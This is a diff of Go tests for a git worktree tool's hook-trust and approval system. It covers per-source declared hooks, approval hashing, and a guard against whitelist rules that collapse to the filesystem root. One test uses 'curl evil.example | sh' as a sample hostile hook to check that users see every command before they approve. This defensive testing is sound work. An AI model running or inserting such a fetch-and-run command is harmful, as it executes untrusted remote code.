@@ -2,11 +2,13 @@ package cmd
 
 import (
 	"bytes"
+	"fmt"
 	"io"
 	"os"
 	"os/exec"
 	"path/filepath"
 	"runtime"
+	"slices"
 	"strings"
 	"sync"
 	"testing"
@@ -21,10 +23,12 @@ import (
 // globals.
 func withPreApprovedHooks(t *testing.T) {
 	t.Helper()
-	savedSources, savedHooks := hookSources, worktreeHooks
-	hookSources, worktreeHooks = map[string]string{}, Hooks{}
+	savedSources, savedHooks, savedDeclared := hookSources, worktreeHooks, declaredHooks
+	hookSources, worktreeHooks, declaredHooks = map[string]string{}, Hooks{}, map[string]Hooks{}
 	t.Setenv("WT_HOOKS_APPROVE_ALL", "1")
-	t.Cleanup(func() { hookSources, worktreeHooks = savedSources, savedHooks })
+	t.Cleanup(func() {
+		hookSources, worktreeHooks, declaredHooks = savedSources, savedHooks, savedDeclared
+	})
 }
 
 // withConfigFileHooks makes the batch under test look like it came from the
@@ -34,12 +38,15 @@ func withConfigFileHooks(t *testing.T, event string, cmds ...string) {
 	t.Helper()
 	withoutTrustWhitelist(t)
 	savedSources, savedHooks, savedPath := hookSources, worktreeHooks, configFilePath
+	savedDeclared := declaredHooks
 	hookSources = map[string]string{event: hookSourceConfigFile}
 	worktreeHooks = Hooks{}
 	setHooks(&worktreeHooks, event, cmds)
+	declaredHooks = map[string]Hooks{hookSourceConfigFile: worktreeHooks}
 	configFilePath = filepath.Join(t.TempDir(), "config.toml")
 	t.Cleanup(func() {
 		hookSources, worktreeHooks, configFilePath = savedSources, savedHooks, savedPath
+		declaredHooks = savedDeclared
 	})
 }
 
@@ -64,12 +71,13 @@ func repoWithHooks(t *testing.T, body string) (repoDir, trustKey string) {
 
 	savedPath, savedFound := configRepoPath, configRepoFound
 	savedKey, savedKeyFn := configRepoKey, repoTrustKeyFn
-	savedHooks, savedSources := worktreeHooks, hookSources
+	savedHooks, savedSources, savedDeclared := worktreeHooks, hookSources, declaredHooks
 	repoTrustKeyFn = func() (string, error) { return trustKey, nil }
 	t.Cleanup(func() {
 		configRepoPath, configRepoFound = savedPath, savedFound
 		configRepoKey, repoTrustKeyFn = savedKey, savedKeyFn
 		worktreeHooks, hookSources = savedHooks, savedSources
+		declaredHooks = savedDeclared
 	})
 
 	writeRepoConfig(t, repoDir, body)
@@ -98,6 +106,7 @@ func writeRepoConfig(t *testing.T, repoDir, body string) {
 	}
 	worktreeHooks = Hooks{}
 	hookSources = map[string]string{}
+	declaredHooks = map[string]Hooks{hookSourceRepoConfig: cfg.Hooks}
 	for _, event := range hookEvents {
 		cmds := hooksOf(cfg.Hooks, event)
 		if len(cmds) == 0 {
@@ -161,7 +170,13 @@ func TestUntrustedRepoPreHookDoesNotAbort(t *testing.T) {
 func TestTrustedRepoHooksRun(t *testing.T) {
 	withIsolatedTrustStore(t)
 	withPolicy(t, hookPolicyPromptUntrusted)
-	repoDir, _ := repoWithHooks(t, "[hooks]\npost_create = [\"touch ok\"]\n")
+
+	// The command has to be the one the .wt.toml declares, and reach runHooks the
+	// way every caller does — via getHooks. An approval covers the commands it
+	// was hashed over, so a test handing runHooks some other batch would be
+	// testing a path no caller takes and that approveHooks now refuses anyway.
+	marker := filepath.Join(t.TempDir(), "ok")
+	repoWithHooks(t, fmt.Sprintf("[hooks]\npost_create = [%q]\n", "touch "+filepath.ToSlash(marker)))
 
 	trust, err := hookSetTrust(hookSourceRepoConfig)
 	if err != nil {
@@ -171,8 +186,7 @@ func TestTrustedRepoHooksRun(t *testing.T) {
 		t.Fatal(err)
 	}
 
-	marker := filepath.Join(repoDir, "ok")
-	if err := runHooks("post_create", []string{"touch " + marker}, map[string]string{}); err != nil {
+	if err := runHooks("post_create", getHooks("post_create"), map[string]string{}); err != nil {
 		t.Fatalf("runHooks() returned error: %v", err)
 	}
 	if _, err := os.Stat(marker); err != nil {
@@ -538,16 +552,29 @@ post_clone = ["theirs too"]
 		t.Errorf("worktreeHooks.PostClone = %v, want empty", worktreeHooks.PostClone)
 	}
 
-	// Each source's contribution has to be recoverable from the merged result,
-	// because that is what an approval is pinned to. post_create belongs to the
-	// repo alone even though the config file also named it.
+	// What each source *asked for*, not what survived the merge: an approval is
+	// pinned to this list, so the config file keeps the post_create the repo
+	// shadowed. Reading the merged result instead would make the identity of the
+	// user's own hooks depend on which repository they were standing in.
 	repoEntries := hookSetEntries(hookSourceRepoConfig)
 	if len(repoEntries) != 1 || repoEntries[0].Event != "post_create" || repoEntries[0].Cmd != "theirs" {
 		t.Errorf("hookSetEntries(repo) = %+v, want the single post_create command", repoEntries)
 	}
 	userEntries := hookSetEntries(hookSourceConfigFile)
-	if len(userEntries) != 1 || userEntries[0].Event != "pre_create" || userEntries[0].Cmd != "mine" {
-		t.Errorf("hookSetEntries(config file) = %+v, want the pre_create command it still owns", userEntries)
+	wantUser := []hookEntry{{Event: "pre_create", Cmd: "mine"}, {Event: "post_create", Cmd: "mine too"}}
+	if !slices.Equal(userEntries, wantUser) {
+		t.Errorf("hookSetEntries(config file) = %+v, want everything the file declared: %+v", userEntries, wantUser)
+	}
+
+	// The same file has to hash the same whether or not a repo shadowed one of
+	// its events — that is the property the merged reading broke.
+	shadowed := hookSetHash(hookSourceConfigFile, userEntries)
+	withRepo := declaredHooks[hookSourceRepoConfig]
+	declaredHooks[hookSourceRepoConfig] = Hooks{}
+	alone := hookSetHash(hookSourceConfigFile, hookSetEntries(hookSourceConfigFile))
+	declaredHooks[hookSourceRepoConfig] = withRepo
+	if alone != shadowed {
+		t.Errorf("config file hashed differently with a repo present (%q) and without (%q)", shadowed, alone)
 	}
 	if got := loadedHookSources(); len(got) != 2 {
 		t.Errorf("loadedHookSources() = %v, want both layers", got)
@@ -630,7 +657,7 @@ func TestMalformedTrustStoreIsAnError(t *testing.T) {
 // of it — otherwise a harmless post_create buys silent consent for a pre_remove
 // the user never saw.
 func TestApprovalRequestShowsWholeSet(t *testing.T) {
-	savedHooks, savedSources := worktreeHooks, hookSources
+	savedHooks, savedSources, savedDeclared := worktreeHooks, hookSources, declaredHooks
 	worktreeHooks = Hooks{
 		PostCreate: []string{"echo hello"},
 		PreRemove:  []string{"curl evil.example | sh"},
@@ -639,7 +666,10 @@ func TestApprovalRequestShowsWholeSet(t *testing.T) {
 		"post_create": hookSourceRepoConfig,
 		"pre_remove":  hookSourceRepoConfig,
 	}
-	t.Cleanup(func() { worktreeHooks, hookSources = savedHooks, savedSources })
+	declaredHooks = map[string]Hooks{hookSourceRepoConfig: worktreeHooks}
+	t.Cleanup(func() {
+		worktreeHooks, hookSources, declaredHooks = savedHooks, savedSources, savedDeclared
+	})
 
 	var buf bytes.Buffer
 	entries := hookSetEntries(hookSourceRepoConfig)
@@ -831,7 +861,7 @@ func TestTrustSurvivesADeletedWorkingDirectory(t *testing.T) {
 func TestPromptAllStillAsksWhenTheTrustStoreIsUnreadable(t *testing.T) {
 	withIsolatedTrustStore(t)
 	withPolicy(t, hookPolicyPromptAll)
-	repoDir, _ := repoWithHooks(t, "[hooks]\npost_create = [\"true\"]\n")
+	repoWithHooks(t, "[hooks]\npost_create = [\"echo shown-to-the-user\"]\n")
 
 	path := trustFilePath()
 	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
@@ -842,13 +872,12 @@ func TestPromptAllStillAsksWhenTheTrustStoreIsUnreadable(t *testing.T) {
 	}
 
 	stderr := captureStderr(t)
-	marker := filepath.Join(repoDir, "ran")
-	if err := runHooks("post_create", []string{"touch " + marker}, map[string]string{}); err != nil {
+	if err := runHooks("post_create", getHooks("post_create"), map[string]string{}); err != nil {
 		t.Fatal(err)
 	}
 	out := stderr()
 
-	if !strings.Contains(out, "true") {
+	if !strings.Contains(out, "echo shown-to-the-user") {
 		t.Errorf("the commands were never put to the user, got:\n%s", out)
 	}
 	if strings.Contains(out, "skipping post_create hooks from .wt.toml") {
@@ -898,10 +927,13 @@ func TestUnrecognisedSourceIsNotTrusted(t *testing.T) {
 	withPolicy(t, hookPolicyPromptUntrusted)
 	withoutTrustWhitelist(t)
 
-	savedSources, savedHooks := hookSources, worktreeHooks
+	savedSources, savedHooks, savedDeclared := hookSources, worktreeHooks, declaredHooks
 	hookSources = map[string]string{"post_create": "git config (local)"}
 	worktreeHooks = Hooks{PostCreate: []string{"true"}}
-	t.Cleanup(func() { hookSources, worktreeHooks = savedSources, savedHooks })
+	declaredHooks = map[string]Hooks{"git config (local)": worktreeHooks}
+	t.Cleanup(func() {
+		hookSources, worktreeHooks, declaredHooks = savedSources, savedHooks, savedDeclared
+	})
 
 	trust, err := hookSetTrust("git config (local)")
 	if err != nil {
@@ -966,13 +998,58 @@ func TestTrustWhitelist(t *testing.T) {
 	}
 }
 
+// TestTrustRuleCannotCollapseToTheWholeFilesystem: whitelist entries go through
+// expandHome, which expands environment variables, so an unset one turns a rule
+// that reads like it names one tree into "/" — every repository on the machine,
+// silently. A rule that names no directory in particular has to match nothing.
+func TestTrustRuleCannotCollapseToTheWholeFilesystem(t *testing.T) {
+	root := t.TempDir()
+	repo := filepath.Join(root, "repo")
+	if err := os.MkdirAll(repo, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	repoKey := filepath.Join(repo, ".git")
+
+	savedPrefix, savedExact := trustPrefixes, trustExact
+	t.Cleanup(func() { trustPrefixes, trustExact = savedPrefix, savedExact })
+
+	// Unset, so os.ExpandEnv resolves it to "".
+	if err := os.Unsetenv("WT_TEST_UNSET_TRUST_ROOT"); err != nil {
+		t.Fatal(err)
+	}
+
+	for _, entry := range []string{
+		"$WT_TEST_UNSET_TRUST_ROOT/",
+		"$WT_TEST_UNSET_TRUST_ROOT/../",
+		string(filepath.Separator),
+	} {
+		trustPrefixes, trustExact = []string{entry}, nil
+		if trustWhitelistAllows(repoKey) {
+			t.Errorf("prefix = [%q] whitelisted every repository on the machine", entry)
+		}
+		trustPrefixes, trustExact = nil, []string{entry}
+		if trustWhitelistAllows(repoKey) {
+			t.Errorf("exact = [%q] whitelisted the filesystem root", entry)
+		}
+	}
+
+	// The same rule with the variable set still works: the guard rejects rules
+	// that name nothing, not rules that use variables.
+	t.Setenv("WT_TEST_UNSET_TRUST_ROOT", root)
+	trustPrefixes, trustExact = []string{"$WT_TEST_UNSET_TRUST_ROOT/"}, nil
+	if !trustWhitelistAllows(repoKey) {
+		t.Error("a resolvable variable in a [trust] prefix stopped matching")
+	}
+}
+
 // TestWhitelistedRepoHooksRunUnasked: the whole point of the escape hatch is
 // that it works without a stored approval — and without a readable store, since
 // an opt-out that depends on the machinery it bypasses is not one.
 func TestWhitelistedRepoHooksRunUnasked(t *testing.T) {
 	withIsolatedTrustStore(t)
 	withPolicy(t, hookPolicyPromptUntrusted)
-	repoDir, trustKey := repoWithHooks(t, "[hooks]\npost_create = [\"true\"]\n")
+	marker := filepath.Join(t.TempDir(), "ran")
+	_, trustKey := repoWithHooks(t, fmt.Sprintf("[hooks]\npost_create = [%q]\n", "touch "+filepath.ToSlash(marker)))
 
 	path := trustFilePath()
 	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
@@ -984,8 +1061,7 @@ func TestWhitelistedRepoHooksRunUnasked(t *testing.T) {
 
 	trustPrefixes = []string{filepath.Dir(trustKey)}
 
-	marker := filepath.Join(repoDir, "ran")
-	if err := runHooks("post_create", []string{"touch " + marker}, map[string]string{}); err != nil {
+	if err := runHooks("post_create", getHooks("post_create"), map[string]string{}); err != nil {
 		t.Fatal(err)
 	}
 	if _, err := os.Stat(marker); err != nil {
